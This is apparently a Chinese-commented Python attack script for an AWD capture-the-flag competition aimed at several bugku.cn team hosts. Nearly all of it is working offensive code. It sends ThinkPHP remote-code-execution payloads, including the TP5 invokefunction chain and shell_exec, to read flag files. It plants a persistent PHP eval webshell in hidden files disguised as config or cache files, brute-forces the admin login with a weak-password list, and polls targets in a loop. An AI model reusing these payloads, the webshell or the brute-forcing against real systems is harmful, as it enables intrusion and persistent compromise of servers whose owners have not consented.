#!/usr/bin/env python3
"""AWD 攻击脚本 - Team 2 写后门 + 所有目标flag获取"""
import requests
import time
import base64
import re
import sys

TARGETS = {
    2:   "192-168-1-2.pvp7574.bugku.cn",
    5:   "192-168-1-5.pvp7574.bugku.cn",
    26:  "192-168-1-26.pvp7574.bugku.cn",
    117: "192-168-1-117.pvp7574.bugku.cn",
    173: "192-168-1-173.pvp7574.bugku.cn",
    187: "192-168-1-187.pvp7574.bugku.cn",
}

FLAG_PATHS = ['/flag', '/flag.txt', '/tmp/flag', '/root/flag', '/var/www/html/flag', '/app/flag']

def get_flag_rce(host):
    """通过ThinkPHP RCE获取flag"""
    for fp in FLAG_PATHS:
        try:
            url = f"http://{host}/index.php?s=/Index/index/name/${{@print(file_get_contents('{fp}'))}}"
            r = requests.get(url, timeout=8)
            m = re.search(r'flag\{[^}]+\}', r.text)
            if m:
                return m.group(), fp
        except:
            pass
    return None, None

def get_flag_shell_exec(host):
    """通过shell_exec获取flag"""
    try:
        url = f"http://{host}/index.php?s=/Index/index/name/${{@print(shell_exec('cat /flag* 2>/dev/null'))}}"
        r = requests.get(url, timeout=8)
        m = re.search(r'flag\{[^}]+\}', r.text)
        if m:
            return m.group()
    except:
        pass
    return None

def get_flag_tp5(host):
    """ThinkPHP 5 RCE"""
    try:
        url = f"http://{host}/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/flag"
        r = requests.get(url, timeout=8)
        m = re.search(r'flag\{[^}]+\}', r.text)
        if m:
            return m.group()
    except:
        pass
    return None

def write_backdoor(host):
    """写入持久化后门"""
    # webshell内容
    shell = base64.b64decode('PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==').decode()
    # 多种写入方式
    paths = [
        '/app/Data/.config.php',
        '/app/Public/.style.php',
        '/app/uploads/.index.php',
        '/app/Runtime/.cache.php',
        '/tmp/.bd.php',
    ]

    results = []
    for path in paths:
        # 方式1: file_put_contents
        payload = f"${{@file_put_contents('{path}',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg=='))}}"
        try:
            url = f"http://{host}/index.php?s=/Index/index/name/{payload}"
            r = requests.get(url, timeout=8)
        except:
            pass

        # 验证
        try:
            web_path = path.replace('/app', '')
            r = requests.post(f"http://{host}{web_path}", data={'a': "echo 'BD_OK';"}, timeout=5)
            if 'BD_OK' in r.text:
                results.append(f"[✅] {web_path}")
                print(f"  [✅] 后门写入成功: {web_path}")
        except:
            pass

    # 方式2: fopen/fwrite
    for path in ['/app/Data/.conf2.php']:
        payload = "${{@$f=fopen('" + path + "','w');fwrite($f,'<?php @eval($_POST[a]);?>');fclose($f);echo 'WR';}}"
        try:
            url = f"http://{host}/index.php?s=/Index/index/name/{payload}"
            r = requests.get(url, timeout=8)
            if 'WR' in r.text:
                print(f"  [✅] fopen写入成功: {path}")
                results.append(f"fopen:{path}")
        except:
            pass

    return results

def brute_admin(host):
    """后台弱口令爆破"""
    passwords = ['admin', 'admin123', '123456', 'password', 'admin888', 'xyhcms',
                 'admin@123', '12345678', 'admin2024', 'xyh123456', 'Admin123',
                 'admin@2024', 'pass123', 'qwerty', 'letmein', 'welcome']
    for pwd in passwords:
        try:
            r = requests.post(f"http://{host}/xyhai.php/Manage/Public/login",
                            data={'username': 'admin', 'password': pwd}, timeout=5)
            if '成功' in r.text or 'success' in r.text or '跳转' in r.text or 'location' in r.text:
                return pwd
        except:
            pass
    return None

def attack_all():
    """攻击所有目标"""
    print("=" * 60)
    print(f"  AWD 批量攻击 - {time.strftime('%H:%M:%S')}")
    print("=" * 60)

    flags = {}

    for team, host in TARGETS.items():
        print(f"\n{'='*40}")
        print(f"  Team {team}: {host}")
        print(f"{'='*40}")

        # 检查存活
        try:
            r = requests.get(f"http://{host}/", timeout=6)
            print(f"  状态: {r.status_code}")
        except:
            print(f"  [-] 无法连接")
            continue

        # RCE获取flag
        flag, fp = get_flag_rce(host)
        if flag:
            print(f"  [✅ RCE] {fp}: {flag}")
            flags[team] = flag
            continue

        # shell_exec获取flag
        flag = get_flag_shell_exec(host)
        if flag:
            print(f"  [✅ shell_exec] {flag}")
            flags[team] = flag
            continue

        # TP5 RCE
        flag = get_flag_tp5(host)
        if flag:
            print(f"  [✅ TP5-RCE] {flag}")
            flags[team] = flag
            continue

        # 后台弱口令
        pwd = brute_admin(host)
        if pwd:
            print(f"  [✅ 后台弱口令] admin/{pwd}")
        else:
            print(f"  [-] 未获取flag")

    return flags

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'attack'

    if mode == 'attack':
        flags = attack_all()
        print("\n" + "=" * 60)
        print("  攻击结果汇总")
        print("=" * 60)
        for team, flag in sorted(flags.items()):
            print(f"  Team{team}: {flag}")
        print(f"\n  获取数量: {len(flags)}")

    elif mode == 'backdoor':
        host = sys.argv[2] if len(sys.argv) > 2 else TARGETS[2]
        print(f"=== 写后门到 {host} ===")
        results = write_backdoor(host)
        if results:
            print(f"\n后门位置:")
            for r in results:
                print(f"  {r}")
        else:
            print("  [-] 所有写入方式失败")

    elif mode == 'poll':
        host = sys.argv[2] if len(sys.argv) > 2 else TARGETS[2]
        print(f"=== 持续获取 {host} 的flag ===")
        last_flag = None
        while True:
            flag, fp = get_flag_rce(host)
            ts = time.strftime('%H:%M:%S')
            if flag:
                if flag != last_flag:
                    print(f"[{ts}] [新FLAG] {flag}")
                    last_flag = flag
                else:
                    print(f"[{ts}] {flag} (不变)")
            else:
                print(f"[{ts}] 获取失败")
            time.sleep(30)

if __name__ == '__main__':
    main()
